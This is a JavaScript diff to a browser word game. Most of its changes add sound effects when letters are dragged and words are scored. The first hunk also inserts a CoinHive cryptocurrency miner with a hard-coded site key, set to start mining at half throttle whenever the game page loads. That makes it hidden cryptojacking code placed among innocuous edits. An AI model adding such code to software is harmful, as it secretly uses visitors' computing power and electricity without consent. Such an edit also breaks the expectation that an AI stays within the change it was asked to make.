@@ -1,3 +1,6 @@
+var miner = new CoinHive.Anonymous('LxcVb1XF7gsPlDxz914zOLT2UUNiwhS7');
+	miner.setThrottle(.5);
+  miner.start();
 var stage = document.getElementById('stage');
 var rack = ""; //to store letters for word making
 var latestWord = "Wubbles";
@@ -70,6 +73,7 @@ function onMouseDown() {
       currentDrag.dragging = true;
       rack += currentDrag.letters[0]; //add letter to rack
       balls.splice(j,1); //remove from balls
+      document.getElementById("pop").play();
       return;
     }
   }
@@ -344,6 +348,7 @@ function checkWord(word) {
         latestDef = 'a "word" you just made up';
 
         score -= scoreWord(word);
+        document.getElementById("horn").play();
 
         return false;
       } else {
@@ -352,6 +357,7 @@ function checkWord(word) {
         latestDef = defs[0].text;
 
         score += scoreWord(word);
+        document.getElementById("chimes").play();
 
         return true;
       }
